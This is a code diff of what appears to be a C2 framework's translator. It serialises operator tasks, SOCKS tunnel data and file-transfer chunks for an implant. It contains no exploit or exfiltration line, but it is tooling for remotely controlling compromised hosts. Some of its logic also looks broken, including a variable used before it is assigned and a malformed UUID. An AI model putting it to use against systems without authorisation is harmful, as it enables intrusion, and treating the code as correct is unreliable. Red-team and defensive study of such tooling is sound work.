@@ -13,86 +13,137 @@ def CheckinImp( uuid ):
 
     return Data;
 
-def RespTasking( Tasks ) -> bytes:
+def RespTasking( Tasks, Socks ) -> bytes:
+    RespTaskDbg("------------------------")
 
-    RespTaskDbg( "------------------------" );
+    Pkg     = Packer()
+    JobID   = Jobs["get_tasking"]["hex_code"]
+    SockPkg = Packer()
+    TaskLength = len(Tasks)
 
-    Pkg = Packer();
+    for Sock in Socks:
+        TaskLength += 1
+        SrvId = Sock["server_id"]
+        Data  = Sock["data"]
+        Ext   = Sock["exit"]
 
-    JobID       = Jobs["get_tasking"]["hex_code"];
-    TaskLength  = len( Tasks );
+        if Ext is False:
+            Ext = 0
+        else:
+            Ext = 1
 
-    RespTaskDbg( f"job id    : {JobID}" );
-    RespTaskDbg( f"task qtt  : {TaskLength}" );
+        TaskUUIDSck = "55555555-5555-5555-555-555555555555"
 
-    Pkg.Int8( JobID );
-    Pkg.Int32( TaskLength );
+        RespTaskDbg( f"socks exit: {Ext}" )
+        RespTaskDbg( f"socks id: {SrvId}" )
+
+        if Data is not None:
+            RespTaskDbg( f"socks data: {Data} [{len( Data )} bytes]" )
+        
+        SockPkg.Int16( T_SOCKS )
+        SockPkg.Int32( Ext )
+        SockPkg.Int32( SrvId )
+
+        if Data is not None:
+            SockPkg.Bytes( Data.encode() )    
+
+        RespTaskDbg( f"socks all buffer: {SockPkg.buffer} [{SockPkg.length} bytes]" )
+
+    Pkg.Int8( JobID )
+    Pkg.Int32( TaskLength )
+
+    for Sock in Socks:
+        Pkg.Bytes( TaskUUIDSck.encode() )
+        Pkg.Bytes( SockPkg.buffer )
 
     for Task in Tasks:
-        Command    = Task["command"];
-        TaskUUID   = Task["id"].encode( );
-        Parameters = json.loads( Task["parameters"] );        
+        Command = Task["command"]
+        TaskUUID = Task["id"].encode()
+
+        Parameters = {}
+        if Task["parameters"] is None or Task["parameters"] == "":
+            Parameters = {}
+        else:
+            try:
+                if isinstance(Task["parameters"], str):
+                    Parameters = json.loads(Task["parameters"])
+                elif isinstance(Task["parameters"], dict):
+                    Parameters = Task["parameters"]
+                else:
+                    Parameters = {}
+            except (json.JSONDecodeError, TypeError):
+                Parameters = {}
+
+        Pkg.Bytes(TaskUUID)
+        TaskPkg = Packer()
 
         if "action" in Parameters:
-            main_cmd = Command;
-            sub_cmd  = Parameters["action"];
+            main_cmd = Command
+            sub_cmd = Parameters["action"]
 
-            print( f"full param: {Parameters}" );
-            print( f"action    : {sub_cmd}" );
-            
             if main_cmd in Commands and 'subcommands' in Commands[main_cmd]:
-                TaskID = Commands[main_cmd]['hex_code'];
+                CommandID = Commands[main_cmd]['hex_code']
                 
                 if sub_cmd in Commands[main_cmd]['subcommands']:
-                    SubID = Commands[main_cmd]['subcommands'][sub_cmd]['sub'];
+                    SubCommandID = Commands[main_cmd]['subcommands'][sub_cmd]['sub']
                 else:
-                    RespTaskDbg( f"Unknown subcommand: {sub_cmd}" );
-                    continue;
+                    RespTaskDbg(f"Unknown subcommand: {sub_cmd}")
+                    continue
             else:
-                RespTaskDbg( f"Command doesn't support subcommands: {main_cmd}" );
-                continue;
+                RespTaskDbg(f"Command doesn't support subcommands: {main_cmd}")
+                continue
         else:
             if Command in Commands:
-                TaskID = Commands[Command]['hex_code'];
-                SubID = 0;
+                CommandID = Commands[Command]['hex_code']
+                SubCommandID = 0
             else:
-                RespTaskDbg( f"Unknown command: {Command}" );
-                continue;
+                RespTaskDbg(f"Unknown command: {Command}")
+                continue
 
-        Pkg.Int16( int( TaskID ) );
-        Pkg.Bytes( TaskUUID );
+        TaskPkg.Int16(int(CommandID))
+        RespTaskDbg( f"command id: {CommandID}" )
         
-        if SubID != 0:
-            Pkg.Int8( SubID );
-
-        RespTaskDbg( f"command   : {Command}" );
-        RespTaskDbg( f"task uuid : {TaskUUID}" );
-        RespTaskDbg( f"task id   : {TaskID}" );
-        if SubID != 0:
-            RespTaskDbg( f"sub id    : {SubID}" );
-        RespTaskDbg( f"parameters: {Parameters}" );
+        if SubCommandID != 0:
+            TaskPkg.Int8(SubCommandID)
+            RespTaskDbg( f"sub id: {SubCommandID}" )
 
         for Key, Val in Parameters.items():
             if Key != "action":
-                if isinstance( Val, int ) or ( isinstance( Val, str ) and Val.isdigit() ):
-                    RespTaskDbg( f"parameter: {Val} [type: int]" );
-                    Pkg.Int32( int( Val ) );
-                elif isinstance( Val, str ):
-                    RespTaskDbg( f"parameter: {Val} [type: str]" );
-                    Pkg.Bytes( str( Val ).encode() );
-                elif isinstance( Val, bool ):
-                    RespTaskDbg( f"parameter: {Val} [type: bool]" );
-                    Pkg.Int32( int( Val ) );
-                elif isinstance( Val, bytes ):
-                    RespTaskDbg( f"parameter: {Val} [type: bytes]" );
-                    Pkg.Bytes( Val );
-    
-    RespTaskDbg( "------------------------" );
-    
-    return Pkg.buffer;
+                try:
+                    hex_bytes = bytes.fromhex(Val)
+                    RespTaskDbg(f"parameter with len: {len(hex_bytes)} [type: hex:bytes]")
+                    TaskPkg.Pad(hex_bytes)
+                except (ValueError, AttributeError, TypeError):
+                    if isinstance(Val, str):
+                        RespTaskDbg(f"parameter: {Val} [type: str]")
+                        TaskPkg.Bytes(str(Val).encode())
+                    elif isinstance(Val, int):
+                        RespTaskDbg(f"parameter: {int(Val)} [type: int]")
+                        TaskPkg.Int32(int(Val))
+                    elif isinstance(Val, bool):
+                        RespTaskDbg(f"parameter: {int(Val)} [type: bool]")
+                        TaskPkg.Int32(int(Val))
+                    elif isinstance(Val, bytes):
+                        RespTaskDbg(f"parameter: {len(Val)} [type: bytes]")
+                        TaskPkg.Pad(Val)
+            
+        if SockPkg.buffer:
+            sock_data = SockPkg.buffer
+            Pkg.Bytes( sock_data )
+
+        task_data = TaskPkg.buffer
+        RespTaskDbg(f"task uuid: {TaskUUID} with data [{len(task_data)} bytes]")
+        Pkg.Bytes(task_data)
+
+    RespTaskDbg("------------------------")
+    return Pkg.buffer
 
 def RespPosting( Responses ):
     RespPostDbg( "------------------------" );
+
+    if not Responses:
+        RespPostDbg("No responses to post.")
+        return b""
 
     RespPostDbg( f"responses: {Responses}" );
 
@@ -108,8 +159,16 @@ def RespPosting( Responses ):
     
     RespPostDbg( f"status: {Response["status"]}" );
 
+    if Response["status"] == "success":
+        Pkg.Int32( 1 );
+    else: 
+        Pkg.Int32( 0 );
+    
     for Response in Responses:
-        FileID = Response
+        FileID = Response.get( "file_id" )
+        if FileID:
+            Pkg.Bytes( FileID.encode( "utf-8" ) );
+            RespPostDbg( f"file id: {FileID}" );
 
         TotalChunks = Response.get( "total_chunks" );
         if TotalChunks:
@@ -124,7 +183,7 @@ def RespPosting( Responses ):
         ChunkData = Response.get( "chunk_data" );
         if ChunkData:
             Pkg.Bytes( base64.b64decode( ChunkData ) );
-            RespPostDbg( f"Chunk Data: {len(ChunkData)} bytes" );
+            RespPostDbg( f"Chunk Data: {len( base64.b64decode( ChunkData ) )} bytes" );
             Data = Pkg.buffer;
 
     RespPostDbg( "------------------------" );
